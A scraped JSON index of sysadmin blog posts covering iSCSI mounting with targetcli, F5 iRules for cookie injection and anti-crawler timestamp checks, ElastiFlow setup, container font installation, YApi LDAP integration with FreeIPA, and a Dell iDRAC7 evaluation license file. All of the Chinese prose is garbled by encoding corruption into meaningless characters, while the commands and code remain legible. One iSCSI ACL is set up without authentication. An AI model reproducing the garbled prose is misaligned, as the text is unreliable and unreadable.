ç³»ç»Ÿä¸­ä¼šå¤šå‡ºä¸€å—ç›˜ï¼Œ/dev/sda\nç›´æ¥æ ¼å¼åŒ–ï¼Œä¸è¦åˆ†åŒºï¼Œmkfs.xfs /dev/sda\næŸ¥å‡ºuuid\n1blkid /dev/sda 2/dev/sda: UUID=\u0026#34;58024012-aa03-4091-a11a-0bb74beeed5a\u0026#34; TYPE=\u0026#34;xfs\u0026#34; ç¼–è¾‘/etc/fstab\n1vi /etc/fstab 2UUID=58024012-aa03-4091-a11a-0bb74beeed5a /mnt xfs _netdev 0 0 Ok, æå®šã€‚\nå¢åŠ ç»™vis-18-31-48å¢åŠ pxeçš„sanbootå¯åŠ¨ç¡¬ç›˜çš„æ–¹æ³•ï¼š\n1#åˆ’ä¸ªlvcï¼Œç”¨çš„æ˜¯vg-targetdçš„20Tä¸­çš„80G 2lvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd 3 4#å»ºç«‹blockå—è®¾å¤‡ 5targetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48 6 7#å»ºç«‹30.18ä¸Šçš„iscsiæœåŠ¡ç«¯ï¼Œä¼¼ä¹ç”¨renhe-18-30-18æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä¸å¥½åŒºåˆ†å¤šä¸ªå· 8targetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48 9 10#å»ºç«‹lunsï¼Œä¼šè‡ªåŠ¨å»ºç«‹portal 11targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48 12 13#å»ºç«‹å®¢æˆ·ç«¯çš„iscsiï¼Œä¸åŠ è®¤è¯ 14targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48 è¿™æ ·å®¢æˆ·ç«¯ç”¨ iqn.2020-10.com.ddky:vis-13-31-48 å°±å¯ä»¥mountå‡ºæ¥\n","date":"2023-08-01","img":"","permalink":"https://rendoumi.com/posts/20230801-iscsi_volume/","series":null,"tags":null,"title":"Iscsiå·çš„è¿œç¨‹æŒ‚è½½ä½¿ç”¨"},{"categories":null,"content":"F5-Bigipåˆ©ç”¨iruleå¼ºè¡Œç»™è¯·æ±‚æ¤å…¥Cookieçš„æ–¹æ³•ã€‚\niruleæœ‰ä¸¤ç§åšæ³•å¯ä»¥è®©é“¾æ¥é‡å®šå‘\nHTTP::redirect \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot;\ræˆ–è€…ï¼š\nHTTP::respond 302 Location \u0026quot;http://redirect.domain.com[HTTP::uri]\u0026quot; \u0026quot;locale\u0026quot; $cookie\ræˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬äºŒç§æ–¹æ³•æ¥å¼ºè¡Œå¡è¿›cookie\nwhen HTTP_REQUEST {\rif {[HTTP::host] equals â€œfind.domain.comâ€ and [HTTP::path] equals â€œ/â€ } {\rset local_cookie [HTTP::cookie value lg_locale]\rset cookie [format \u0026quot;locale=%s; path=/; domain=%s\u0026quot; $local_cookie \u0026quot;\u0026lt;cookiedomain\u0026gt;\u0026quot;]\rHTTP::respond 302 Location â€œhttp://redirect.domain.com[HTTP::uri]â€ â€œSet-Cookieâ€ $cookie\r}\r}\rç»“æœï¼š ","date":"2023-07-27","img":"","permalink":"https://rendoumi.com/posts/20230727-f5_irule_cookie/","series":null,"tags":null,"title":"F5åˆ©ç”¨iruleå¼ºè¡Œæ¤å…¥cookie"},{"categories":null,"content":"F5-Bigipåˆ©ç”¨iruleé˜²æ­¢çˆ¬è™«çš„ä¸€æ³•ã€‚\nçˆ¬è™«çš„è¯·æ±‚ï¼š\n1GET /cms/rest.htm?method=ddky.cms.search.recommend.h5.o2o\u0026amp;pageNo=1\u0026amp;pageSize=6\u0026amp;shopId=201790\u0026amp;ordertypeId=0\u0026amp;suite=1\u0026amp;searchType=o2o\u0026amp;searchPanel=1\u0026amp;wd=%E6%B4%9B%E4%B8%81%E6%96%B0\u0026amp;lat=22.520712193695\u0026amp;lng=113.9233553732\u0026amp;city=%E6%B7%B1%E5%9C%B3%E5%B8%82\u0026amp;type=90\u0026amp;unique=05685D2A5DAB8ABBD2E5E5B26E0C960F\u0026amp;versionName=5.7.5\u0026amp;plat=H5\u0026amp;platform=H5\u0026amp;t=2020-12-15%2014%3A19%3A11\u0026amp;v=1.0\u0026amp;sign=A6BD136BC1B6F91E5C7DD5A0DA03DD79\u0026amp;callback=jsonp1 é‡Œé¢çš„tå€¼æ˜¯æ—¶é—´ï¼Œt=2020-12-15%2014%3A19%3A11\nä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªå€¼ä¸€ç›´ä¸å˜äº†ï¼Œé‚£æˆ‘ä»¬å°±åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚å¦‚æœTå€¼è·Ÿå½“å‰æ—¶é—´å¯¹æ¯”ï¼Œæ˜¯3åˆ†é’Ÿå‰çš„ï¼Œé‚£å°±å°ï¼\nF5çš„iruleï¼Œç›´æ¥returnçš„æ˜¯ç™½åå•ï¼š\n1when HTTP_REQUEST { 2 3 set t [URI::decode [URI::query [HTTP::uri] t]] 4 set before [clock scan \u0026#34;180 seconds ago\u0026#34; ] 5 6 if { [IP::addr [IP::client_addr] equals 124.206.168.0/255.255.255.224]} { 7 return} 8 if { [IP::addr [IP::client_addr] equals 61.135.14.96/255.255.255.240]} { 9 return} 10 if { [IP::addr [IP::client_addr] equals 114.251.7.112/255.255.255.240]} { 11 return} 12 if { [string tolower [HTTP::uri]] contains \u0026#34;/cms/\u0026#34;} { 13 14 if {$before \u0026gt; [clock scan $t]} { 15 drop 16 } 17 } 18} ","date":"2023-07-27","img":"","permalink":"https://rendoumi.com/posts/20230727-f5_irule_t/","series":null,"tags":null,"title":"F5åˆ©ç”¨iruleé˜²çˆ¬è™«"},{"categories":null,"content":"elasticflow æ˜¯ä¸ªæµé‡åˆ†æå·¥å…·ï¼Œé€šè¿‡å¯¹å„ç§flowæµé‡çš„æŠ“å–ï¼Œåˆ†ææ•°æ®ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°å±€åŸŸç½‘ä¸­çš„æµé‡ã€‚\nç½‘ç®¡çš„å¿…å¤‡å•Šã€‚é¦–å…ˆè¦æŠŠsflowæµé‡ç»™å‘è¿‡æ¥ã€‚(è¿™é‡Œ172.18.31.23æ˜¯æœåŠ¡å™¨ç«¯)\n1sflow collector 2 ip 172.18.31.23 description flow-server æ‹‰å–æºä»£ç ï¼š\n1git clone https://github.com/robcowart/elastiflow å¯åŠ¨é›†ç¾¤\n1docker-compose up -d è¿™æ ·æ•´ä¸ªæ•°æ®ä¼šè¢«æ¸…ç©ºï¼Œéœ€è¦é‡æ–°ç”Ÿæˆä¸€éï¼Œå…ˆæŠŠkibanaçš„æ•°æ®æ–‡ä»¶æ‹‰å›æ¥\n1wget https://raw.githubusercontent.com/robcowart/elastiflow/master/kibana/elastiflow.kibana.7.8.x.ndjson ç„¶åç™»å½•http://172.18.31.23:5601 å…ˆåˆ°é…ç½®ï¼Œå¯¼å…¥ å¯¼å…¥å¯¹è±¡ï¼Œé€‰æ‹©elastiflow.kibana.7.8.x.ndjsonæ–‡ä»¶ä¸Šä¼  å¯¼å…¥æˆåŠŸï¼Œå¯¼å…¥äº†300å¤šä¸ªå¯¹è±¡ ç„¶åé…ç½®ç´¢å¼•ï¼Œåº”è¯¥ä¸ç”¨é…ï¼Œç›´æ¥é€‰ä¸€ä¸ªåšdefault è¿™æ ·å°±okäº†ï¼Œå»dashboardçš„overviewå°±èƒ½çœ‹åˆ°ä¸œè¥¿äº† ç„¶åå»ä¿®æ”¹ä¸€ä¸‹shardç­–ç•¥ï¼Œçœå¾—ç´¢å¼•æŠ¥é»„è‰²\n1PUT /_template/elastiflow-3.5.3 2{ 3 \u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;, 4 \u0026#34;settings\u0026#34;: { 5 \u0026#34;number_of_shards\u0026#34;: 1 6 } 7} 8PUT /_template/index_defaults 9{ 10 \u0026#34;index_patterns\u0026#34;: \u0026#34;*\u0026#34;, 11 \u0026#34;settings\u0026#34;: { 12 \u0026#34;number_of_shards\u0026#34;: 1 13 } 14} 15PUT /_template/elastiflow-3.5.3 16{ 17 \u0026#34;index_patterns\u0026#34;: \u0026#34;elastiflow-3.5.3-*\u0026#34;, 18 \u0026#34;settings\u0026#34;: { 19 \u0026#34;number_of_shards\u0026#34;: 1 20 } 21} æŸ¥çœ‹ä¸€ä¸‹ï¼š\n1curl -s -X GET \u0026#39;http://localhost:9200/_cat/indices?v\u0026#39; 2curl -s -X GET \u0026#39;http://localhost:9200/_template\u0026#39;| jq ","date":"2023-07-24","img":"","permalink":"https://rendoumi.com/posts/20230724-elasticflow/","series":null,"tags":null,"title":"ç»ç‰ˆçš„elasticflowçš„å®‰è£…"},{"categories":null,"content":"pod å®¹å™¨å†…è¦ç”¨ä¸­æ–‡é›…é»‘å­—ä½“ç”Ÿæˆ jpg å›¾ç‰‡ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æŠŠå­—ä½“ç»™è£…è¿›å»\né¦–å…ˆè¿›å…¥å®¹å™¨ï¼Œç¡®å®šå®¹å™¨çš„åŸºåº•æ˜¯ä»€ä¹ˆï¼Œæ˜¯yumã€aptæˆ–è€…apk\né€šå¸¸éƒ½æ˜¯ç”¨apkæœ€å°åŒ–å®‰è£…çš„ï¼Œè¿™æ ·åšæ³•å¦‚ä¸‹ï¼š\n1apk update 2apk add --update ttf-dejavu fontconfig 3rm -rf /var/cache/apk/* 4 5mkdir /usr/share/fonts/chinese 6 7cp /usr/local/jre1.8.0_201/lib/fonts/simsun.ttc /usr/share/fonts/chinese 8 9mkfontscale \u0026amp;\u0026amp; mkfontdir \u0026amp;\u0026amp; fc-cache è¿™æ ·å°±æå®šäº†ï¼Œå½“ç„¶è¿™åªæ˜¯ä¸´æ—¶çš„ã€‚\nè¦æƒ³é•¿ä¹…å°±å¾—ä¿®æ”¹Dockerfileï¼ŒæŠŠæ–‡ä»¶æ‹·è¿›å®¹å™¨ï¼Œç„¶ååŒæ ·å¾—æ‰§è¡Œå‘½ä»¤å³å¯ã€‚\n","date":"2023-07-06","img":"","permalink":"https://rendoumi.com/posts/20230706-fonts_in_pod/","series":null,"tags":null,"title":"å¦‚ä½•åœ¨å®¹å™¨å†…å®‰è£…å­—ä½“æ–‡ä»¶"},{"categories":null,"content":"2023å¹´ä¸ŠåŠå¹´ç»è¿‡åŠªåŠ›ï¼Œåˆè€ƒäº†3å¼ è¯ä¹¦ï¼Œä¸‹åŠå¹´ç»§ç»­åŠªåŠ›å¥‹æ–—\u0026hellip;\u0026hellip;\n","date":"2023-06-30","img":"","permalink":"https://rendoumi.com/posts/20230630-certificates/","series":null,"tags":null,"title":"2023å¹´è·å¾—çš„è¯ä¹¦"},{"categories":null,"content":"Freeipaæ¥å…¥Yapi.\nvi my-api/config.json\n1... 2 \u0026#34;ldapLogin\u0026#34;: { 3 \u0026#34;enable\u0026#34;: true, 4 \u0026#34;server\u0026#34;: \u0026#34;ldap://ldap.bybon.cn\u0026#34;, 5 \u0026#34;baseDn\u0026#34;: \u0026#34;uid=manager,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;, 6 \u0026#34;bindPassword\u0026#34;: \u0026#34;xxxxxxxx\u0026#34;, 7 \u0026#34;searchDn\u0026#34;: \u0026#34;cn=users,cn=accounts,dc=bybon,dc=cn\u0026#34;, 8 \u0026#34;searchStandard\u0026#34;: \u0026#34;mail\u0026#34;, 9 \u0026#34;emailPostfix\u0026#34;: \u0026#34;@bybon.cn\u0026#34;, 10 \u0026#34;emailKey\u0026#34;: \u0026#34;mail\u0026#34;, 11 \u0026#34;usernameKey\u0026#34;: \u0026#34;displayName\u0026#34; 12 } è¿™é‡Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œvi my-yapi/vendors/server/controllers/user.js\nç†ç”±å¦‚ä¸‹ï¼Œç™»å½•çš„æ—¶å€™ï¼Œyapiçš„é€»è¾‘æ˜¯å…ˆåˆ¤æ–­ç”¨æˆ·é‚®ä»¶ï¼ŒæŠŠé‚®ä»¶ä¸­çš„ç”¨æˆ·åæ‘˜å‡ºæ¥ï¼Œç„¶ååŠ ä¸Šé…ç½®ä¸­çš„é‚®ä»¶åŸŸã€‚\nè¿™ä¸ªé€»è¾‘åœ¨ldapä¸­å°±ä¸å¯¹äº†ï¼Œæ”¹æˆå¦‚ä¸‹æ ¼å¼ï¼Œè¿™æ ·ç›´æ¥è¾“å…¥ldapç”¨æˆ·åå°±å¯ä»¥ç™»å½•äº†\n1 /** 2 * ldapç™»å½• 3 * @interface /user/login_by_ldap 4 * @method 5 * @category user 6 * @foldnumber 10 7 * @param {String} email emailåç§°ï¼Œä¸èƒ½ä¸ºç©º 8 * @param {String} password å¯†ç ï¼Œä¸èƒ½ä¸ºç©º 9 * @returns {Object} 10 * 11 */ 12 async getLdapAuth(ctx) { 13 try { 14 const { email, password } = ctx.request.body; 15 //no const username = email.split(/\\@/g)[0]; 16 //1 const { info: ldapInfo } = await ldap.ldapQuery(email, password); 17 //2 const emailPrefix = email.split(/\\@/g)[0]; 18 //3 const emailPostfix = yapi.WEBCONFIG.ldapLogin.emailPostfix; 19 20 //zrr 21 const emailPrefix = email.split(/\\@/g)[0]; 22 const emailPostfix = yapi.WEBCONFIG.ldapLogin.emailPostfix; 23 const { info: ldapInfo } = await ldap.ldapQuery( 24 (emailPostfix ? emailPrefix + emailPostfix : email),password); 25 //zrr 26 27 28 const emailParams = 29 ldapInfo[yapi.WEBCONFIG.ldapLogin.emailKey || \u0026#39;mail\u0026#39;] || 30 (emailPostfix ? emailPrefix + emailPostfix : email); 31 const username = ldapInfo[yapi.WEBCONFIG.ldapLogin.usernameKey] || emailPrefix; ","date":"2023-04-12","img":"","permalink":"https://rendoumi.com/posts/20230412-freeipa_yapi/","series":null,"tags":null,"title":"Yapié›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"categories":null,"content":"æ–°å…¬å¸çš„dellæœåŠ¡å™¨idracå±…ç„¶æ²¡æœ‰licenseï¼Œæ— æ³•è¿œç¨‹ï¼Œæ‰¾äº†dellè¦äº†ä¸€ä¸ªä¸´æ—¶licenseç»™è£…ä¸Šï¼Œå…¶å®è£…å¥½ç³»ç»Ÿå°±ä¸ä¼šå¤ªç”¨åˆ°äº†ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä»¥åå¤‡ç”¨ã€‚\n1\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; 2\u0026lt;!--Copyright (c) 2010-2011 Dell Inc. All Rights Reserved.--\u0026gt; 3\u0026lt;lns:LicenseClass xmlns:ds=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:lns=\u0026#34;http://www.dell.com/2011/12G/licensing\u0026#34;\u0026gt; 4 \u0026lt;lns:LicenseData\u0026gt; 5 \u0026lt;lns:Schema lns:Vendor=\u0026#34;Dell\u0026#34; lns:ID=\u0026#34;iDRAC\u0026#34; lns:maxDepth=\u0026#34;255\u0026#34; lns:SchemaVersion=\u0026#34;2.0\u0026#34;/\u0026gt; 6 \u0026lt;lns:TransferableLicense\u0026gt;false\u0026lt;/lns:TransferableLicense\u0026gt; 7 \u0026lt;lns:UTCdateSold\u0026gt;2011-09-20T16:10:37Z\u0026lt;/lns:UTCdateSold\u0026gt; 8 \u0026lt;lns:EntitlementID\u0026gt;56r8irR7fV5w3MIxlJUFL9Ph_Lori_Matthews\u0026lt;/lns:EntitlementID\u0026gt; 9 \u0026lt;lns:DeviceClass lns:ID=\u0026#34;iDRAC\u0026#34;/\u0026gt; 10 \u0026lt;lns:ProductDescription\u0026gt; 11 \u0026lt;lns:lang_en\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_en\u0026gt; 12 \u0026lt;lns:lang_es\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_es\u0026gt; 13 \u0026lt;lns:lang_fr\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_fr\u0026gt; 14 \u0026lt;lns:lang_de\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_de\u0026gt; 15 \u0026lt;lns:lang_it\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_it\u0026gt; 16 \u0026lt;lns:lang_ja\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_ja\u0026gt; 17 \u0026lt;lns:lang_zh\u0026gt;iDRAC7 Enterprise Evaluation License\u0026lt;/lns:lang_zh\u0026gt; 18 \u0026lt;/lns:ProductDescription\u0026gt; 19 \u0026lt;lns:LicenseTerm\u0026gt; 20 \u0026lt;lns:Evaluation lns:Duration=\u0026#34;P30D\u0026#34;/\u0026gt; 21 \u0026lt;/lns:LicenseTerm\u0026gt; 22 \u0026lt;lns:DeviceInfo lns:ID=\u0026#34;1\u0026#34; lns:VendorID=\u0026#34;0x1912\u0026#34; lns:DeviceID=\u0026#34;0x0011\u0026#34;/\u0026gt; 23 \u0026lt;lns:Feature lns:ID=\u0026#34;1\u0026#34; lns:Description=\u0026#34;License Management\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 24 \u0026lt;lns:Feature lns:ID=\u0026#34;2\u0026#34; lns:Description=\u0026#34;RACADM\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 25 \u0026lt;lns:Feature lns:ID=\u0026#34;3\u0026#34; lns:Description=\u0026#34;WSMAN\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 26 \u0026lt;lns:Feature lns:ID=\u0026#34;4\u0026#34; lns:Description=\u0026#34;SNMP\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 27 \u0026lt;lns:Feature lns:ID=\u0026#34;5\u0026#34; lns:Description=\u0026#34;Auto Discovery\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 28 \u0026lt;lns:Feature lns:ID=\u0026#34;6\u0026#34; lns:Description=\u0026#34;USC Firmware Update\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 29 \u0026lt;lns:Feature lns:ID=\u0026#34;7\u0026#34; lns:Description=\u0026#34;Update Package\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 30 \u0026lt;lns:Feature lns:ID=\u0026#34;8\u0026#34; lns:Description=\u0026#34;USC Operating System Deployment\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 31 \u0026lt;lns:Feature lns:ID=\u0026#34;9\u0026#34; lns:Description=\u0026#34;USC Device Configuration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 32 \u0026lt;lns:Feature lns:ID=\u0026#34;10\u0026#34; lns:Description=\u0026#34;USC Diagnostics\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 33 \u0026lt;lns:Feature lns:ID=\u0026#34;11\u0026#34; lns:Description=\u0026#34;Power Budget\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 34 \u0026lt;lns:Feature lns:ID=\u0026#34;12\u0026#34; lns:Description=\u0026#34;Power Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 35 \u0026lt;lns:Feature lns:ID=\u0026#34;13\u0026#34; lns:Description=\u0026#34;Virtual Media\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 36 \u0026lt;lns:Feature lns:ID=\u0026#34;14\u0026#34; lns:Description=\u0026#34;Telnet\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 37 \u0026lt;lns:Feature lns:ID=\u0026#34;15\u0026#34; lns:Description=\u0026#34;SMASH CLP\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 38 \u0026lt;lns:Feature lns:ID=\u0026#34;16\u0026#34; lns:Description=\u0026#34;IPv6\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 39 \u0026lt;lns:Feature lns:ID=\u0026#34;17\u0026#34; lns:Description=\u0026#34;Dynamic DNS\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 40 \u0026lt;lns:Feature lns:ID=\u0026#34;18\u0026#34; lns:Description=\u0026#34;Dedicated NIC\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 41 \u0026lt;lns:Feature lns:ID=\u0026#34;19\u0026#34; lns:Description=\u0026#34;Directory Services\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 42 \u0026lt;lns:Feature lns:ID=\u0026#34;20\u0026#34; lns:Description=\u0026#34;Two-Factor Authentication\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 43 \u0026lt;lns:Feature lns:ID=\u0026#34;21\u0026#34; lns:Description=\u0026#34;Single Sign-On\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 44 \u0026lt;lns:Feature lns:ID=\u0026#34;22\u0026#34; lns:Description=\u0026#34;PK Authentication\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 45 \u0026lt;lns:Feature lns:ID=\u0026#34;23\u0026#34; lns:Description=\u0026#34;Crash Screen Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 46 \u0026lt;lns:Feature lns:ID=\u0026#34;24\u0026#34; lns:Description=\u0026#34;Crash Video Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 47 \u0026lt;lns:Feature lns:ID=\u0026#34;25\u0026#34; lns:Description=\u0026#34;Boot Capture\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 48 \u0026lt;lns:Feature lns:ID=\u0026#34;26\u0026#34; lns:Description=\u0026#34;Virtual Console\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 49 \u0026lt;lns:Feature lns:ID=\u0026#34;27\u0026#34; lns:Description=\u0026#34;Virtual Flash Partitions\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 50 \u0026lt;lns:Feature lns:ID=\u0026#34;28\u0026#34; lns:Description=\u0026#34;Console Collaboration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 51 \u0026lt;lns:Feature lns:ID=\u0026#34;29\u0026#34; lns:Description=\u0026#34;Device Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 52 \u0026lt;lns:Feature lns:ID=\u0026#34;30\u0026#34; lns:Description=\u0026#34;Remote Inventory\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 53 \u0026lt;lns:Feature lns:ID=\u0026#34;31\u0026#34; lns:Description=\u0026#34;Storage Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 54 \u0026lt;lns:Feature lns:ID=\u0026#34;32\u0026#34; lns:Description=\u0026#34;Remote Firmware Update\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 55 \u0026lt;lns:Feature lns:ID=\u0026#34;33\u0026#34; lns:Description=\u0026#34;Remote Firmware Configuration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 56 \u0026lt;lns:Feature lns:ID=\u0026#34;34\u0026#34; lns:Description=\u0026#34;Remote Inventory Export\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 57 \u0026lt;lns:Feature lns:ID=\u0026#34;35\u0026#34; lns:Description=\u0026#34;Remote Operating System Deployment\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 58 \u0026lt;lns:Feature lns:ID=\u0026#34;36\u0026#34; lns:Description=\u0026#34;Backup and Restore\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 59 \u0026lt;lns:Feature lns:ID=\u0026#34;37\u0026#34; lns:Description=\u0026#34;Part Replacement\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 60 \u0026lt;lns:Feature lns:ID=\u0026#34;38\u0026#34; lns:Description=\u0026#34;SSH\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 61 \u0026lt;lns:Feature lns:ID=\u0026#34;39\u0026#34; lns:Description=\u0026#34;Remote File Share\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 62 \u0026lt;lns:Feature lns:ID=\u0026#34;40\u0026#34; lns:Description=\u0026#34;Virtual Folders\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 63 \u0026lt;lns:Feature lns:ID=\u0026#34;41\u0026#34; lns:Description=\u0026#34;Web GUI\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 64 \u0026lt;lns:Feature lns:ID=\u0026#34;42\u0026#34; lns:Description=\u0026#34;Network Time Protocol\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 65 \u0026lt;lns:Feature lns:ID=\u0026#34;43\u0026#34; lns:Description=\u0026#34;Email Alerts\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 66 \u0026lt;lns:Feature lns:ID=\u0026#34;44\u0026#34; lns:Description=\u0026#34;Security Lockout\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 67 \u0026lt;lns:Feature lns:ID=\u0026#34;45\u0026#34; lns:Description=\u0026#34;Remote Syslog\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 68 \u0026lt;lns:Feature lns:ID=\u0026#34;253\u0026#34; lns:Description=\u0026#34;Integrated Dell Remote Access Controller 7 Enterprise\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; 69 \u0026lt;/lns:LicenseData\u0026gt; 70\u0026lt;dsig:Signature xmlns:dsig=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u0026gt; 71\u0026lt;dsig:SignedInfo\u0026gt; 72\u0026lt;dsig:CanonicalizationMethod Algorithm=\u0026#34;http://www.w3.org/2001/10/xml-exc-c14n#\u0026#34;/\u0026gt; 73\u0026lt;dsig:SignatureMethod Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#rsa-sha1\u0026#34;/\u0026gt; 74\u0026lt;dsig:Reference URI=\u0026#34;\u0026#34;\u0026gt; 75\u0026lt;dsig:Transforms\u0026gt; 76\u0026lt;dsig:Transform Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature\u0026#34;/\u0026gt; 77\u0026lt;/dsig:Transforms\u0026gt; 78\u0026lt;dsig:DigestMethod Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#sha1\u0026#34;/\u0026gt; 79\u0026lt;dsig:DigestValue\u0026gt;DrtnjP0vUsyT+18jazjmiaGrvc0=\u0026lt;/dsig:DigestValue\u0026gt; 80\u0026lt;/dsig:Reference\u0026gt; 81\u0026lt;/dsig:SignedInfo\u0026gt; 82\u0026lt;dsig:SignatureValue\u0026gt;Qg4Omx1ZGrVllUPbg/X25aJxK5qlNCF/G04NLwXhbmpqoplSRkCCUgb+6TvVz9b3 83Ut7sSa/WjA0mv+mbcqIENTAnpveIkIOQPR3mdjCBwX2cLYieV9nOIGobxqHU7o97 84QjbSAkmTHcRo0PI6mP8tc7Od4WNWMZ48rrUBeOrVOr1EZeptPUbeaSofy4nvlzbC 85pcpzZLbjAITT157r9KiFe9joG2hCEClrQPO0ScXHgKXrAWrQE9wX7e2De4uCvJwI 86hGWpJzDQNJJZbsWhDoZJn/59G/KRjzxIHIzIpUt1XPPIGHl5yMXDaRFcIMES0RuJ 87SWZS8tt9E001Fr/8/jQNgA==\u0026lt;/dsig:SignatureValue\u0026gt; 88\u0026lt;dsig:KeyInfo\u0026gt; 89\u0026lt;dsig:X509Data\u0026gt; 90\u0026lt;dsig:X509Certificate\u0026gt;MIIDTjCCAjagAwIBAgIBATANBgkqhkiG9w0BAQUFADBRMRMwEQYDVQQKEwpEZWxs 91LCBJbmMuMSEwHwYDVQQLExhFbWJlZGRlZCBMaWNlbnNlIE1hbmFnZXIxFzAVBgNV 92BAMTDkNBIENlcnRpZmljYXRlMB4XDTEwMDEwMTAwMDAwMFoXDTM1MTIzMTIzNTk1 93OVowVjETMBEGA1UEChMKRGVsbCwgSW5jLjEhMB8GA1UECxMYRW1iZWRkZWQgTGlj 94ZW5zZSBNYW5hZ2VyMRwwGgYDVQQDExNTaWduaW5nIENlcnRpZmljYXRlMIIBIjAN 95BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqbRo2DZtkjxl5YtqD5ePYdzrWbkU 96YQJwVaWYe1tE7ZAdou5TLTsjPnaa1cLcPTexn+cq8YjukIVwkwJP7yJ5GkrYGUnf 970Q6unWWgwcgTStlpflz31e8AbxXqNYZEFvEktojYS0kAfiYES+H02GUU5PtV7B9Y 98BbtZEowU2DPuqRGG1FF8mAsp1vojcbQGx+nS2Of47oQJRrJlh28COXyf2w/+IRAz 99RmeYin+9pisfrT9fmlUtxa7sAAV/KZFRx8ED31YiktXgI/u/PNnHlchiCMaL6pzA 100HMBf115O7A2y6IZ9sXUHvH8V9QnDkWT1XHMn8GCW8HXOA5zA232OxiaRmQIDAQAB 